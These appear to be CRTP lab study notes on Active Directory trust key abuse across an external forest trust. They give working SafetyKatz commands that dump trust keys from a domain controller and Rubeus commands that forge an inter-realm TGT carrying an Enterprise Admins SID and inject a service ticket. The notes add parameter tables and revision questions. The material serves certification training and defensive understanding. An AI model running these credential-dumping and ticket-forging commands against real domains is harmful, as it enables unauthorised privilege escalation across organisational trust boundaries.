# Across External Trust – Trust Key Abuse

## Overview

This section covers **Trust Key Abuse across an external/inter-forest trust**.

The objective is to obtain the **trust key** from the Domain Controller that maintains the external trust and use that key to **forge an inter-realm Kerberos TGT**. The forged ticket can then be used to request a service ticket in the trusted forest.

### High-Level Attack Flow

```text
DC with External Trust
        │
        ▼
Obtain Trust Key
        │
        ▼
Forge Inter-Realm TGT
        │
        ▼
Use Forged TGT
        │
        ▼
Request TGS for Target Service
        │
        ▼
Access Resource in Trusted Forest
```

---

# 1. Obtain the Trust Key

The first requirement is the **trust key for the inter-forest trust**.

The supplied material provides two approaches using SafetyKatz.

### Method 1 — `lsadump::trust`

```cmd
SafetyKatz.exe -Command '"lsadump::trust /patch"'
```

### Method 2 — `lsadump::lsa`

```cmd
SafetyKatz.exe -Command '"lsadump::lsa /patch"'
```

### Purpose

These commands are used in the lab to retrieve information associated with the trust relationship.

The important information required for the next stage is the **trust key**.

Conceptually:

```text
DC
 │
 └── External Trust
       │
       └── Trust Key
             │
             ▼
       Required for
       ticket forging
```

---

# 2. Forge an Inter-Realm TGT

Once the trust key has been obtained, Rubeus is used to create a forged inter-realm TGT.

### Command

```cmd
C:\AD\Tools\Rubeus.exe silver ^
/service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL ^
/rc4:17e8f4d3f4b46e95048a66a5dd890ee3 ^
/sid:S-1-5-21-719815819-3726368948-3917688648 ^
/sids:S-1-5-21-335606122-960912869-3279953914-519 ^
/ldap ^
/user:Administrator ^
/nowrap
```

> The values above are reproduced from the supplied CRTP material. In a real lab, the SID and trust-key values must correspond to the specific environment.

---

## Important Parameters

| Parameter  | Purpose                                                  |
| ---------- | -------------------------------------------------------- |
| `silver`   | Rubeus ticket-forging operation used in the supplied lab |
| `/service` | Specifies the Kerberos service principal being targeted  |
| `/rc4`     | Supplies the key material used by the lab                |
| `/sid`     | Specifies the SID of the relevant domain                 |
| `/sids`    | Adds additional SID information to the forged ticket     |
| `/ldap`    | Obtains relevant domain information through LDAP         |
| `/user`    | Specifies the user represented by the forged ticket      |
| `/nowrap`  | Keeps the ticket output on a single line                 |

The important concept is that the forged ticket contains identity and authorization information that allows the trust relationship to be abused.

---

# 3. Inter-Realm TGT

An **inter-realm TGT** is used when Kerberos authentication crosses a trust boundary between domains/forests.

Conceptually:

```text
FOREST A
DOLLARCORP
     │
     │ External / Inter-Forest Trust
     ▼
FOREST B
MONEYCORP
```

The trust relationship allows authentication to cross from one security boundary to another.

In this lab, the trust key is used to create a forged ticket representing a privileged identity.

---

# 4. Use the Forged Ticket

After creating the forged ticket, the supplied material uses Rubeus to request a service ticket for the target service.

### Command

```cmd
C:\AD\Tools\Rubeus.exe asktgs ^
/service:http/mcorp-dc.MONEYCORP.LOCAL ^
/dc:mcorp-dc.MONEYCORP.LOCAL ^
/ptt ^
/ticket:<FORGED TICKET>
```

### Breakdown

| Parameter  | Meaning                                                      |
| ---------- | ------------------------------------------------------------ |
| `asktgs`   | Requests a Kerberos service ticket                           |
| `/service` | Specifies the target service                                 |
| `/dc`      | Specifies the Domain Controller                              |
| `/ptt`     | Passes/injects the resulting ticket into the current session |
| `/ticket`  | Supplies the previously forged ticket                        |

The target service in the supplied material is:

```text
http/mcorp-dc.MONEYCORP.LOCAL
```

---

# 5. Complete Attack Chain

```text
                 External Trust
                      │
                      ▼
        Identify DC holding trust
                      │
                      ▼
              Obtain Trust Key
                      │
             ┌────────┴────────┐
             ▼                 ▼
     lsadump::trust       lsadump::lsa
             │
             ▼
        Trust Key
             │
             ▼
     Forge Inter-Realm TGT
             │
             ▼
          Rubeus
             │
             ▼
      Forged TGT
             │
             ▼
          asktgs
             │
             ▼
       Target Service
             │
             ▼
       Trusted Forest
```

---

# 6. Commands – Quick Reference

## Obtain Trust Information

```cmd
SafetyKatz.exe -Command '"lsadump::trust /patch"'
```

or:

```cmd
SafetyKatz.exe -Command '"lsadump::lsa /patch"'
```

## Forge Inter-Realm TGT

```cmd
C:\AD\Tools\Rubeus.exe silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:<TRUST_KEY> /sid:<SOURCE_DOMAIN_SID> /sids:<TARGET_SID> /ldap /user:Administrator /nowrap
```

## Request Target Service Ticket

```cmd
C:\AD\Tools\Rubeus.exe asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:<FORGED_TICKET>
```

---

# 7. Key Concepts to Remember

### Trust Key

The secret associated with the trust relationship between the domains/forests.

### Inter-Forest Trust

A relationship that allows authentication to cross between separate AD forests.

### Inter-Realm TGT

A Kerberos ticket used to facilitate authentication across Kerberos realms/security boundaries.

### Ticket Forging

Creating a Kerberos ticket containing selected identity and authorization information using appropriate key material.

### `asktgs`

Rubeus functionality used to request a service ticket using the available Kerberos authentication material.

### `/ptt`

Passes the resulting ticket into the current logon session.

---

# 8. CRTP Mental Model

The most important thing is not memorizing the long commands.

Remember:

```text
TRUST
  ↓
TRUST KEY
  ↓
FORGED INTER-REALM TGT
  ↓
ASK FOR TGS
  ↓
TARGET SERVICE
  ↓
TRUSTED FOREST
```

The core idea is:

> **A trust relationship creates a path between security boundaries. If the trust key is compromised, the trust relationship itself can potentially be abused to forge Kerberos authentication material and cross into the trusted environment.**

---

# 9. Revision Questions

Before moving on, make sure you can answer these without looking at your notes:

1. What is an external/inter-forest trust?
2. What is the trust key?
3. Why is the trust key important for ticket forging?
4. What is an inter-realm TGT?
5. What is the purpose of `asktgs`?
6. What does `/ptt` do?
7. Why is the target service specified in `/service`?
8. What is the difference between the source and trusted forest?
9. What information is contained in the forged ticket?
10. What is the complete attack chain from **trust → privileged access**?

### One-line memory aid

**Trust Key → Forge TGT → Request TGS → Cross Trust → Access Target Service**
